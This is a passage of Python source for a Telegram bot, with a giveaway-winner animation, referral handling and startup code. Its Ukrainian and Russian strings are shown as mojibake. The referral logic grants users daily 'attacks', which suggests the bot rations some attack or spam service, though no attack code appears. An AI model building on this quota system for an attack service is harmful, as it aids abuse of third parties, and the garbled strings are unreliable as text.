        f"üéâ <b>–í—ñ—Ç–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è!</b>\n\n"
        f"üèÜ –ü–µ—Ä–µ–º–æ–∂–µ—Ü—å —Ä–æ–∑—ñ–≥—Ä–∞—à—É VIP-—Å—Ç–∞—Ç—É—Å—É:\n"
        f"üë§ {profile_link}\n"
        f"üÜî ID: <code>{winner_id}</code>\n\n"
        f"üéä –í—ñ—Ç–∞—î–º–æ –∑ –ø–µ—Ä–µ–º–æ–≥–æ—é!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            chat_id=chat_id,
            message_id=message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è: {e}")
        # –Ø–∫—â–æ –Ω–µ –º–æ–∂–µ–º–æ –≤—ñ–¥—Ä–µ–¥–∞–≥—É–≤–∞—Ç–∏, –Ω–∞–¥—Å–∏–ª–∞—î–º–æ –Ω–æ–≤–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        try:
            await bot.send_message(chat_id, final_text, parse_mode='HTML')
        except Exception as send_error:
            logging.error(f"–ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—ñ —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è: {send_error}")

async def run_inline_giveaway_animation(inline_message_id: str, active_users: list):
    """–ê–Ω–∏–º–∞—Ü–∏—è —Ä–æ–∑—ã–≥—Ä—ã—à–∞ –¥–ª—è inline-—Å–æ–æ–±—â–µ–Ω–∏–π"""
    import random
    
    # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –¥–ª—è –∞–Ω—ñ–º–∞—Ü—ñ—ó
    search_messages = [
        "üé™ –ü–µ—Ä–µ–º–µ—à–∏–≤–∞—é —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤...",
        "‚ö° –ó–∞–ø—É—Å–∫–∞—é –≥–µ–Ω–µ—Ä–∞—Ç–æ—Ä —Å–ª—É—á–∞–π–Ω—ã—Ö —á–∏—Å–µ–ª...",
        "‚ú® –û–ø—Ä–µ–¥–µ–ª—è—é –ø–æ–±–µ–¥–∏—Ç–µ–ª—è...",
        "üéØ –ü–æ—á—Ç–∏ –≥–æ—Ç–æ–≤–æ...",
    ]
    
    total_steps = 4
    step_duration = 3.0  # —Å–µ–∫—É–Ω–¥–∞ –Ω–∞ —à–∞–≥
    
    for step in range(total_steps):
        # –°—Ç–≤–æ—Ä—é—î–º–æ –ø—Ä–æ–≥—Ä–µ—Å-–±–∞—Ä
        filled = (step + 1) * 2
        empty = 8 - filled
        progress_bar = "‚ñì" * filled + "‚ñë" * empty
        percentage = (step + 1) * 25
        
        # –í–∏–±–∏—Ä–∞—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        if step < len(search_messages):
            message = search_messages[step]
        else:
            message = random.choice(search_messages)
        
        # –û–Ω–æ–≤–ª—é—î–º–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
        text = f"üéâ <b>–†–æ–∑—ñ–≥—Ä–∞—à VIP-—Å—Ç–∞—Ç—É—Å—É</b>\n\n{message}\n\n[{progress_bar}] {percentage}%\n\nüë• –£—á–∞—Å–Ω–∏–∫—ñ–≤: {len(active_users)}"
        
        try:
            await bot.edit_message_text(
                text,
                inline_message_id=inline_message_id,
                parse_mode='HTML'
            )
        except Exception as e:
            logging.error(f"–û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è inline-—Å–æ–æ–±—â–µ–Ω–∏—è –Ω–∞ —à–∞–≥–µ {step}: {e}")
            pass
        
        if step < total_steps:
            await asyncio.sleep(step_duration)
    
    # –í–∏–±–∏—Ä–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è
    winner = random.choice(active_users)
    winner_name = winner['name'] or "–ë–µ–∑ –∏–º–µ–Ω–∏"
    winner_username = winner['username']
    winner_id = winner['user_id']
    
    # –§–æ—Ä–º—É—î–º–æ –ø–æ—Å–∏–ª–∞–Ω–Ω—è –Ω–∞ –ø—Ä–æ—Ñ—ñ–ª—å
    if winner_username:
        profile_link = f"<a href='https://t.me/{winner_username}'>@{winner_username}</a>"
    else:
        profile_link = f"<a href='tg://user?id={winner_id}'>{winner_name}</a>"
    
    # –§—ñ–Ω–∞–ª—å–Ω–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è
    final_text = (
        f"üéâ <b>–í—ñ—Ç–∞—î–º–æ –ø–µ—Ä–µ–º–æ–∂—Ü—è!</b>\n\n"
        f"üèÜ –ü–µ—Ä–µ–º–æ–∂–µ—Ü—å —Ä–æ–∑—ñ–≥—Ä–∞—à—É VIP-—Å—Ç–∞—Ç—É—Å—É:\n"
        f"üë§ {profile_link}\n"
        f"üÜî ID: <code>{winner_id}</code>\n\n"
        f"üéä –í—ñ—Ç–∞—î–º–æ –∑ –ø–µ—Ä–µ–º–æ–≥–æ—é!"
    )
    
    try:
        await bot.edit_message_text(
            final_text,
            inline_message_id=inline_message_id,
            parse_mode='HTML'
        )
    except Exception as e:
        logging.error(f"–ü–æ–º–∏–ª–∫–∞ —Ñ—ñ–Ω–∞–ª—å–Ω–æ–≥–æ inline-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è: {e}")

# –î–æ–¥–∞—é —Ñ—É–Ω–∫—Ü—ñ—é –¥–ª—è –Ω–∞—Ä–∞—Ö—É–≤–∞–Ω–Ω—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∏—Ö –∞—Ç–∞–∫
async def process_referral(referrer_id, user_id, username, name):
    if not referrer_id:
        return
    async with db_pool.acquire() as conn:
        await conn.execute(
            'INSERT INTO referrals (referrer_id, referred_id) VALUES ($1, $2) ON CONFLICT (referred_id) DO NOTHING',
            referrer_id, user_id
        )
        # –î–æ–¥–∞—î–º–æ +10 –∞—Ç–∞–∫ –∑–∞–ø—Ä–æ—Å–∏–≤—à–æ–º—É
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10, referral_count = referral_count + 1 WHERE user_id = $1',
            referrer_id
        )
        # –î–æ–¥–∞—î–º–æ +10 –∞—Ç–∞–∫ –∑–∞–ø—Ä–æ—à–µ–Ω–æ–º—É
        await conn.execute(
            'UPDATE users SET referral_attacks = referral_attacks + 10 WHERE user_id = $1',
            user_id
        )
        try:
            ref_name = username or name or f"User{user_id}"
            # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑–∞–ø—Ä–æ—Å–∏–≤—à–æ–º—É
            await bot.send_message(
                referrer_id,
                f"üéâ –ó–∞ –≤–∞—à–∏–º –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –ø—Ä–∏—î–¥–Ω–∞–≤—Å—è –Ω–æ–≤–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á: <a href='tg://user?id={user_id}'>{ref_name}</a>\nüöÄ –í–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ +10 –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∞—Ç–∞–∫ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ!",
                parse_mode='HTML'
            )
            # –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑–∞–ø—Ä–æ—à–µ–Ω–æ–º—É
            referrer_name_result = await conn.fetchrow('SELECT name, username FROM users WHERE user_id = $1', referrer_id)
            if referrer_name_result:
                referrer_name = referrer_name_result['username'] or referrer_name_result['name'] or f"User{referrer_id}"
                await bot.send_message(
                    user_id,
                    f"üéâ –í—ñ—Ç–∞—é! –í–∏ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞–ª–∏—Å—å –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º –≤—ñ–¥ <a href='tg://user?id={referrer_id}'>{referrer_name}</a>\nüöÄ –í–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ +10 –¥–æ–¥–∞—Ç–∫–æ–≤–∏—Ö –∞—Ç–∞–∫ –Ω–∞ —Å—å–æ–≥–æ–¥–Ω—ñ –∑–∞ —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—é!",
                    parse_mode='HTML'
                )
        except Exception as e:
            logging.error(f"Error notifying users about referral: {e}")

async def on_startup(dp):
    """–§—É–Ω–∫—Ü—ñ—è, —è–∫–∞ –≤–∏–∫–ª–∏–∫–∞—î—Ç—å—Å—è –ø—Ä–∏ —Å—Ç–∞—Ä—Ç—ñ –±–æ—Ç–∞"""
    logging.info("–ó–∞–ø—É—Å–∫ —Ñ–æ–Ω–æ–≤–∏—Ö –∑–∞–¥–∞—á...")
    # –ó–∞–ø—É—Å–∫–∞—î–º–æ scheduler –¥–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–Ω–æ–≥–æ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –∞—Ç–∞–∫
    asyncio.create_task(daily_attacks_reset_scheduler())
    logging.info("–§–æ–Ω–æ–≤—ñ –∑–∞–¥–∞—á—ñ –∑–∞–ø—É—â–µ–Ω–æ")

if __name__ == '__main__':
    logging.info("–ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_db())
    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
